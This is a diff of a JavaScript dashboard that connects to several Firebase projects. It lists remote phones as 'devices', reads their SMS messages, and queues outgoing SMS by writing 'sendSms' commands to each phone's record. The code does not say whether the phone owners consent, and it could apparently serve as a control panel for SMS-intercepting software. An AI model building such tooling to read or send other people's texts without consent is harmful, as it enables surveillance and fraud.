@@ -17,9 +17,6 @@ let firebaseConfigsCache = null;
 // CONFIG LOADING
 // ────────────────────────────────────────────────
 
-/**
- * Load Firebase configs from localStorage (called by app.js)
- */
 function loadFirebaseConfigsFromStorage() {
     try {
         const data = localStorage.getItem('firebase_configs');
@@ -37,9 +34,6 @@ function loadFirebaseConfigsFromStorage() {
     return { sources: [] };
 }
 
-/**
- * Load Firebase configs from JSON file
- */
 function loadFirebaseConfigs() {
     console.log('📢 Loading Firebase configs...');
     try {
@@ -65,9 +59,6 @@ function loadFirebaseConfigs() {
     return { sources: [] };
 }
 
-/**
- * Save Firebase configs to localStorage and cache
- */
 function saveFirebaseConfigsToLocal(configs) {
     try {
         localStorage.setItem('firebase_configs', JSON.stringify(configs));
@@ -78,9 +69,6 @@ function saveFirebaseConfigsToLocal(configs) {
     }
 }
 
-/**
- * Add a new Firebase source
- */
 function addFirebaseSource(url, key) {
     const configs = loadFirebaseConfigs();
     const newSource = {
@@ -95,9 +83,6 @@ function addFirebaseSource(url, key) {
     return newSource;
 }
 
-/**
- * Remove a Firebase source
- */
 function removeFirebaseSource(sourceId) {
     const configs = loadFirebaseConfigs();
     configs.sources = configs.sources.filter(s => s.id !== sourceId);
@@ -110,9 +95,6 @@ function removeFirebaseSource(sourceId) {
 // INITIALIZATION
 // ────────────────────────────────────────────────
 
-/**
- * Initialize all Firebase connections from stored configs
- */
 async function initFirebaseConnections() {
     try {
         loadFirebaseConfigsFromStorage();
@@ -145,9 +127,6 @@ async function initFirebaseConnections() {
     }
 }
 
-/**
- * Connect to a single Firebase source
- */
 async function connectToFirebase(source) {
     try {
         const { id, url, key } = source;
@@ -202,9 +181,6 @@ async function connectToFirebase(source) {
     }
 }
 
-/**
- * Disconnect from a Firebase source
- */
 function disconnectFromFirebase(sourceId) {
     try {
         if (firebaseInstances[sourceId]) {
@@ -224,12 +200,9 @@ function disconnectFromFirebase(sourceId) {
 }
 
 // ────────────────────────────────────────────────
-// DEVICE MANAGEMENT - UPDATED FOR YOUR DATA
+// DEVICE MANAGEMENT - USING "users" COLLECTION
 // ────────────────────────────────────────────────
 
-/**
- * Fetch all devices from all connected Firebase sources
- */
 async function fetchAllDevices() {
     allDevices = [];
     const sources = Object.keys(firebaseInstances);
@@ -257,9 +230,6 @@ async function fetchAllDevices() {
     return allDevices;
 }
 
-/**
- * Fetch devices from a specific source - UPDATED FOR YOUR DATA
- */
 async function fetchDevicesFromSource(sourceId) {
     const instance = firebaseInstances[sourceId];
     if (!instance || !instance.connected) {
@@ -274,42 +244,39 @@ async function fetchDevicesFromSource(sourceId) {
         console.log(`📢 Snapshot size: ${snapshot.size} documents`);
 
         if (snapshot.empty) {
-            console.log('⚠️ No devices found in collection');
+            console.log('⚠️ No devices found in users collection');
             return [];
         }
 
         snapshot.forEach(doc => {
             const data = doc.data();
-            console.log(`📢 Device document: ${doc.id}`, data);
             
-            // Extract device info from the nested structure
+            // Extract command data (your structure has commands inside)
             const commandData = data.commands || data;
             
-            // Get the first SMS data if available
-            const smsData = commandData.commands || commandData;
-            
-            // Determine device status based on pending messages
-            const hasPending = smsData.status === 'pending';
-            
+            // Get device info from the data
             const device = {
                 id: doc.id,
                 sourceId: sourceId,
-                name: doc.id.substring(0, 8), // Use part of ID as name
-                number: smsData.number || smsData.to || 'N/A',
-                status: hasPending ? 'offline' : 'online',
-                battery: 50, // Default since not in data
-                signal: '4G', // Default
-                model: smsData.simSlot !== undefined ? `SIM ${parseInt(smsData.simSlot) + 1}` : 'Unknown',
-                lastSeen: smsData.timestamp ? new Date(smsData.timestamp).toISOString() : new Date().toISOString(),
-                sims: smsData.number ? [smsData.number] : ['N/A'],
+                name: commandData.body ? commandData.body.substring(0, 20) : doc.id.substring(0, 8),
+                number: commandData.number || commandData.to || 'N/A',
+                status: commandData.status === 'pending' ? 'offline' : 'online',
+                battery: 50,
+                signal: '4G',
+                model: commandData.simSlot !== undefined ? `SIM ${parseInt(commandData.simSlot) + 1}` : 'Unknown',
+                lastSeen: commandData.timestamp ? new Date(commandData.timestamp).toISOString() : new Date().toISOString(),
+                sims: commandData.number ? [commandData.number] : ['N/A'],
                 unread: 0,
                 raw: data,
-                // Store the command data for SMS tab
-                _commandData: smsData
+                _commandData: commandData,
+                // Store the actual SMS data for display
+                smsBody: commandData.body || commandData.message || commandData.text || '',
+                smsSender: commandData.number || commandData.from || 'Unknown',
+                smsTime: commandData.timestamp ? new Date(commandData.timestamp).toISOString() : new Date().toISOString()
             };
             
             devices.push(device);
-            console.log(`✅ Parsed device: ${device.name} (${device.status})`);
+            console.log(`✅ Parsed device: ${device.id.substring(0, 8)}...`);
         });
 
         return devices;
@@ -319,9 +286,6 @@ async function fetchDevicesFromSource(sourceId) {
     }
 }
 
-/**
- * Listen for real-time device updates from all sources
- */
 function listenToDevices(callback) {
     Object.keys(deviceListeners).forEach(sourceId => {
         deviceListeners[sourceId].forEach(unsubscribe => unsubscribe());
@@ -354,12 +318,9 @@ function listenToDevices(callback) {
 }
 
 // ────────────────────────────────────────────────
-// SMS MANAGEMENT - UPDATED FOR YOUR DATA
+// SMS MANAGEMENT - USING "users" COLLECTION
 // ────────────────────────────────────────────────
 
-/**
- * Fetch SMS messages for a specific device - UPDATED
- */
 async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 100) {
     const instance = firebaseInstances[sourceId];
     if (!instance || !instance.connected) {
@@ -369,7 +330,6 @@ async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 100) {
     try {
         console.log(`📢 Fetching SMS for device: ${deviceId}, SIM: ${simNumber}`);
         
-        // Fetch the device document directly
         const doc = await instance.db.collection('users').doc(deviceId).get();
         
         if (!doc.exists) {
@@ -403,9 +363,6 @@ async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 100) {
     }
 }
 
-/**
- * Listen for real-time SMS updates for a device - UPDATED
- */
 function listenToSms(deviceId, sourceId, simNumber, callback) {
     const instance = firebaseInstances[sourceId];
     if (!instance || !instance.connected) {
@@ -415,7 +372,6 @@ function listenToSms(deviceId, sourceId, simNumber, callback) {
 
     console.log(`📢 Setting up SMS listener for device: ${deviceId}, SIM: ${simNumber}`);
 
-    // Listen to the specific device document
     const unsubscribe = instance.db.collection('users').doc(deviceId)
         .onSnapshot((docSnapshot) => {
             console.log(`📢 SMS update detected for device: ${deviceId}`);
@@ -450,12 +406,9 @@ function listenToSms(deviceId, sourceId, simNumber, callback) {
 }
 
 // ────────────────────────────────────────────────
-// SEND SMS - UPDATED FOR YOUR DATA
+// SEND SMS - USING "users" COLLECTION
 // ────────────────────────────────────────────────
 
-/**
- * Send SMS from a device - UPDATED
- */
 async function sendSms(deviceId, sourceId, simNumber, toNumber, message) {
     const instance = firebaseInstances[sourceId];
     if (!instance || !instance.connected) {
@@ -483,7 +436,6 @@ async function sendSms(deviceId, sourceId, simNumber, toNumber, message) {
             type: "sendSms"
         };
 
-        // Save to Firestore in the device document
         await instance.db.collection('users').doc(deviceId).set({
             commands: smsData
         }, { merge: true });
